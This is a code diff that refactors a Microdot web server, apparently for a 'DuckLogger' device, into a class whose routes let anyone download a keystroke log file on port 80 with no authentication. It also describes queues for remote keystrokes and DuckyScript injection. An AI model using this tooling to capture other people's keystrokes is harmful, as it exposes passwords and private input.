@@ -1,10 +1,7 @@
 import os
 from microdot import Microdot, send_file, Response
 
-app = Microdot()
-
 FILE_PATH = "log.txt"
-CHUNK_SIZE = 1024
 
 
 def file_exists():
@@ -47,20 +44,34 @@ homepage = """
 </html>
 """
 
+class DuckLoggerAPI:
+    """
+    wraper for microdot, with two public queues:
+     - keys:  for storing incoming keys from remote kbd
+     - script: for storing incoming duckyscripts
+    """
+    def __init__(self) -> None:
+        self.app = Microdot()
+        self.setup_routes()
 
-@app.route("/")
-async def index(request):
-    # send HTML with proper content type
-    return Response(body=homepage, headers={'Content-Type': 'text/html'})
+    def setup_routes(self):
+        @self.app.route("/")
+        async def index(request):
+            # send HTML with proper content type
+            return Response(body=homepage, headers={'Content-Type': 'text/html'})
 
+        @self.app.route("/log")
+        async def download_log(request):
+            if not file_exists():
+                return "<h3>404 Not Found</h3>", 404
+            
+            # send file as download
+            return send_file(
+                FILE_PATH,
+                content_type="text/plain",
+            )
 
-@app.route("/log")
-async def download_log(request):
-    if not file_exists():
-        return "<h3>404 Not Found</h3>", 404
-    
-    # send file as download
-    return send_file(
-        FILE_PATH,
-        content_type="text/plain",
-    )
+    def start_server(self):
+        """returns awaitable coroutine"""
+        return self.app.start_server(host="0.0.0.0", port=80)
+
